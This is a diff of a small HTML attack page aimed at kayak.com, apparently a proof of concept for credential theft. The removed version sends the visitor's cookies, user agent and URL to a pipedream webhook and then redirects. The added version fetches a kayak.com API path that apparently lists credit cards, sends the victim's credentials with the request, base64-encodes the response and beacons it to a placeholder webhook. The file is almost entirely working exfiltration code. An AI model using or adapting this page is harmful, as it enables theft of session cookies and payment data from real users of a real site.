@@ -1,28 +1,14 @@
-
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Testing...</title>
-  <script>
-    const data = {
-      cookies: document.cookie,
-      userAgent: navigator.userAgent,
-      location: location.href
-    };
-
-    // Send everything to your webhook
-    navigator.sendBeacon(
-      "https://eoh3rxe2o8pbhuj.m.pipedream.net/",
-      new URLSearchParams(data)
-    );
-
-    // Just redirect after 2s
-    setTimeout(() => {
-      window.location.href = "https://www.kayak.com";
-    }, 2000);
-  </script>
-</head>
+<head><title>Loading...</title></head>
 <body>
-  Testing beacon...
+<script>
+  fetch("https://www.kayak.com/api/whisky/V1/cc/list", {
+    method: "GET",
+    mode: "cors",
+    credentials: "include"
+  }).then(resp => resp.text())
+    .then(data => navigator.sendBeacon("https://your-webhook.com/?" + btoa(data)));
+</script>
 </body>
 </html>
